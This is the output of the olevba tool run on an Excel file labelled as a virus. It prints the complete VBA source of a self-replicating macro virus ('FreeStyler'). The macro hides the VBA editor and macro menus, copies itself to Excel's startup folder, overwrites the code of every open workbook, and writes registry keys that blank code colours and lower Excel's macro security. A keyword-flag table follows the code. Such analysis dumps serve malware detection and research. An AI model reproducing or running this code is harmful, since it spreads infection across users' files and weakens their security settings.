olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Free-0919672a4caa68a78a4adafe47c25d85fa213273
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Free-0919672a4caa68a78a4adafe47c25d85fa213273 - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_Activate()
On Error Resume Next
'VOVAN//SMF
With Application: .EnableCancelKey = 0: .DisplayAlerts = 0: .ScreenUpdating = 0: .CommandBars("Visual Basic").Visible = False: .CommandBars("Macro").Enabled = False: .CommandBars("Window").Controls(3).Enabled = False: .CommandBars("Window").Controls(4).Enabled = False: .CommandBars("Tools").Controls(13).Enabled = False: End With
For vl = 1 To Application.CommandBars("Visual Basic").Controls.Count
Application.CommandBars("Visual Basic").Controls(vl).Enabled = False
Next
For mo = 1 To Application.CommandBars("Macro").Controls.Count
Application.CommandBars("Macro").Controls(mo).Enabled = False
Next
If ThisWorkbook.FullName Like "*:*" = True Then Save_D = True Else Save_D = False
If ThisWorkbook.Saved = True Then Save_T = True Else Save_T = False
If ThisWorkbook.Path = Application.StartupPath Then Application.OnTime Now + TimeValue("00:01:" & Second(Now())), CodeName & ".Workbook_Activate"
If UCase(Dir(Application.StartupPath + "\FreeStyler.")) <> UCase("FREESTYLER") Then
VV = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
Workbooks.Add
With ActiveWorkbook.VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString VV: End With
ActiveWorkbook.SaveAs Filename:=Application.StartupPath & "\FreeStyler."
ActiveWindow.Visible = False
Workbooks("FREESTYLER.").SaveAs Filename:=Application.StartupPath & "\FreeStyler."
Workbooks("FREESTYLER.").Close
End If
For N = 1 To Workbooks.Count
VV = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
For Each TW In Workbooks.Item(N).VBProject.VBComponents
If TW.CodeModule.Find("FreeStyler", 1, 1, 75, 75) Then FreeStyler = True
Next TW
If FreeStyler = False Then
If Workbooks.Item(N).Saved = False Then Save_ = False Else Save_ = True
Workbook_New
With Workbooks.Item(N).VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString VV: End With
If Save_ = True Then
If Workbooks.Item(N).FullName Like "*:*" = True Then
System.Cursor = wdCursorNormal
Workbooks.Item(N).SaveAs Filename:=Workbooks.Item(N).FullName
Else
Workbooks.Item(N).Saved = True
End If
End If
End If
FreeStyler = False
Next N
If ThisWorkbook.Path = Application.StartupPath Then Workbook_New
If Save_D = False And Save_T = True Then ThisWorkbook.Saved = True
If Save_D = True And Save_T = True Then ThisWorkbook.Save
Set WshShell = CreateObject("WScript.Shell")
For z = 1 To 2
If z = 1 Then nf = "Office" Else nf = "6.0\Common"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\" & nf & "\CodeBackColors", "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\" & nf & "\CodeForeColors", "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\" & nf & "\EndProcLine", 0, "REG_DWORD"
Next
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel\Options6", 0, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security\Level", 1, "REG_DWORD"
End Sub
Private Sub Workbook_Open()
Workbook_Activate
End Sub
Private Sub Workbook_New()
On Error Resume Next
If ActiveWorkbook.ReadOnly = True Then Exit Sub
C = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1)
B = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
iii = Mid(C, 13)
ffl = Len(iii) - 2
khh = Left(iii, ffl)
Number = ThisWorkbook.VBProject.VBComponents(1).CodeModule.ProcCountLines(khh, vbext_pk_Proc)
VV = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, Number)
With ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, Number
.InsertLines B, VV
End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Free-0919672a4caa68a78a4adafe47c25d85fa213273 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSExcel.Free-0919672a4caa68a78a4adafe47c25d85fa213273 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSExcel.Free-0919672a4caa68a78a4adafe47c25d85fa213273 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Activate   |Runs when the Excel Workbook is opened       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

